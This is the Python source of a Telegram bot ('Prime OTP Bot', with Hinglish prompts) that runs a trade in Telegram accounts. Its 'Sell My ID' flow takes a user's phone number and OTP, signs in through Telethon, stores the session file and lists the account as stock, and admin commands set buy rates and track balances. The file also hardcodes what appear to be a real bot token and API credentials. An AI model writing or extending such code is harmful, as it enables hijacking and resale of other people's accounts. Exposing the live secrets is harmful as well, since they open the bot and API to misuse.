import telebot
from telebot import types
from telethon import TelegramClient
import asyncio
import time
import os
from flask import Flask
from threading import Thread

# --- RENDER FIX ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online!"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- CONFIG ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw' 
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
bot = telebot.TeleBot(TOKEN)

db = {
    'users': {}, 
    'admins': [7634311488], 
    'stock': [], 
    'buy_rates': {'India': 10, 'USA': 50}
}

def is_admin(uid): return uid in db['admins']

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('📲 Start Login', '💰 Balance', '📥 Deposit', '📤 Sell My ID')
    if is_admin(uid): markup.add('/admin')
    bot.send_message(message.chat.id, "🔥 *Prime OTP Bot Live!*", parse_mode="Markdown", reply_markup=markup)

# --- NEW ADMIN PANEL ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if not is_admin(message.from_user.id): return
    text = (
        "👑 *Full Admin Control*\n\n"
        "💰 *Balance:* \n`/addbal ID Amt` | `/cutbal ID Amt`\n\n"
        "📈 *Rates:* \n`/setrate Country Amt` (No emojis)\n\n"
        "📦 *Stock:* \n`/addid Phone:Details` (ID add karne ke liye)\n`/viewstock` (Stock dekhne ke liye)\n\n"
        "👥 *Users:* \n`/makeadmin ID` | `/users`"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=['addid'])
def add_id_stock(message):
    if is_admin(message.from_user.id):
        try:
            data = message.text.split(None, 1)[1]
            db['stock'].append(data)
            bot.reply_to(message, f"✅ ID Stock mein add ho gayi! Total: {len(db['stock'])}")
        except: bot.reply_to(message, "Usage: `/addid 91999...:SessionData`")

# --- SELLING LOGIC FIX ---
@bot.message_handler(func=lambda message: message.text == '📤 Sell My ID')
def sell_init(message):
    msg = bot.send_message(message.chat.id, "📞 Apna Number bhejein (+91... ke saath):")
    bot.register_next_step_handler(msg, sell_connect)

def sell_connect(message):
    phone = message.text.strip()
    if not phone.startswith('+'):
        return bot.send_message(message.chat.id, "❌ Error! Number + ke saath hona chahiye (Example: +919988...)")
    
    bot.send_message(message.chat.id, f"⏳ {phone} ke liye OTP Request bhej raha hoon...")
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
    asyncio.run(start_telegram(message.chat.id, phone, client))

async def start_telegram(chat_id, phone, client):
    await client.connect()
    try:
        req = await client.send_code_request(phone)
        msg = bot.send_message(chat_id, "📩 OTP mil gaya? Yahan dalo:")
        bot.register_next_step_handler(msg, sell_otp_verify, client, phone, req.phone_code_hash)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Telegram Error: {e}")

def sell_otp_verify(message, client, phone, code_hash):
    otp = message.text.strip()
    asyncio.run(final_login(message.chat.id, otp, client, phone, code_hash))

async def final_login(chat_id, otp, client, phone, code_hash):
    try:
        await client.sign_in(phone, otp, phone_code_hash=code_hash)
        db['stock'].append(f"{phone}:Logged_In")
        bot.send_message(chat_id, "✅ Login Success! ID Stock mein hai, Admin aapko balance de dega.")
        await client.disconnect()
    except Exception as e: bot.send_message(chat_id, f"❌ Login Fail: {e}")

# --- OTHER COMMANDS ---
@bot.message_handler(commands=['setrate'])
def s_rate(message):
    if is_admin(message.from_user.id):
        try:
            _, c, a = message.text.split()
            db['buy_rates'][c] = int(a)
            bot.reply_to(message, f"✅ {c} ka rate ₹{a} set ho gaya.")
        except: bot.reply_to(message, "Galti! Aise likho: `/setrate India 15`")

if __name__ == "__main__":
    keep_alive()
    while True:
        try: bot.polling(none_stop=True)
        except: time.sleep(5)
